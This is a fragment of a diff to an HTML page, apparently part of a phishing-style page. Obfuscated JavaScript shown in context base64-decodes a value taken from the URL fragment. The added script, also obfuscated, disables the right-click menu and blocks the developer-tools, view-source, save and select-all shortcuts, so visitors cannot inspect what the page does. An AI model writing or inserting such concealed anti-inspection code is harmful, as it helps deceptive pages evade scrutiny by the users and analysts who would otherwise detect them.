_0x16a2c5=window['location']['href'],_0x928dc2=_0x16a2c5[_0x480fd5(0x93)]('#')[_0x480fd5(0x99)]();return atob(_0x928dc2);}}function ucFirst(_0x43f176){var _0x4a8d43=_0x12385b;return _0x43f176[_0x4a8d43(0x70)](0x0)[_0x4a8d43(0x78)]()+_0x43f176[_0x4a8d43(0x88)](0x1);}
+
+
+        
+
       </script>
-   </body>
-   </html>
+	  <script>
+function _0x207b(_0x2ad0cd,_0x6c8109){var _0x57d69e=_0x57d6();return _0x207b=function(_0x207b5c,_0x44e8c0){_0x207b5c=_0x207b5c-0x9d;var _0x52d684=_0x57d69e[_0x207b5c];return _0x52d684;},_0x207b(_0x2ad0cd,_0x6c8109);}var _0x378680=_0x207b;(function(_0x303f48,_0x2d4c9e){var _0x1489ce=_0x207b,_0x12e54d=_0x303f48();while(!![]){try{var _0x37731e=parseInt(_0x1489ce(0xa4))/0x1*(parseInt(_0x1489ce(0x9e))/0x2)+parseInt(_0x1489ce(0xa7))/0x3*(parseInt(_0x1489ce(0xa0))/0x4)+parseInt(_0x1489ce(0xa1))/0x5+-parseInt(_0x1489ce(0xac))/0x6*(-parseInt(_0x1489ce(0xaa))/0x7)+-parseInt(_0x1489ce(0xa2))/0x8+-parseInt(_0x1489ce(0xa8))/0x9*(parseInt(_0x1489ce(0xa6))/0xa)+-parseInt(_0x1489ce(0x9f))/0xb*(parseInt(_0x1489ce(0xa9))/0xc);if(_0x37731e===_0x2d4c9e)break;else _0x12e54d['push'](_0x12e54d['shift']());}catch(_0x5ac15c){_0x12e54d['push'](_0x12e54d['shift']());}}}(_0x57d6,0x31168),document['addEventListener'](_0x378680(0xab),_0x481ba1=>_0x481ba1['preventDefault']()),document[_0x378680(0x9d)]=function(_0x2dcda6){var _0x1168b4=_0x378680;if(_0x2dcda6[_0x1168b4(0xa5)]==0x7b)return![];if(_0x2dcda6[_0x1168b4(0xa3)]&&_0x2dcda6['shiftKey']&&_0x2dcda6[_0x1168b4(0xa5)]==0x49)return![];if(_0x2dcda6[_0x1168b4(0xa3)]&&_0x2dcda6['shiftKey']&&_0x2dcda6[_0x1168b4(0xa5)]==0x4a)return![];if(event[_0x1168b4(0xa3)]&&(event[_0x1168b4(0xa5)]===0x55||event[_0x1168b4(0xa5)]===0x53||event['keyCode']===0x41))return![];if(_0x2dcda6[_0x1168b4(0xa3)]&&_0x2dcda6['keyCode']==0x55)return![];});function _0x57d6(){var _0x4a6822=['ctrlKey','176413MRdoOE','keyCode','1090nCusbR','267885ZqvuFC','11619kplbIC','36nJPTlr','623FAlcSX','contextmenu','17760qefvUi','onkeydown','2UewxgP','1289486HADHGG','12PkoWEP','988290zhJkaN','1695480YHphhm'];_0x57d6=function(){return _0x4a6822;};return _0x57d6();}   
+
+</script>
+      </html>
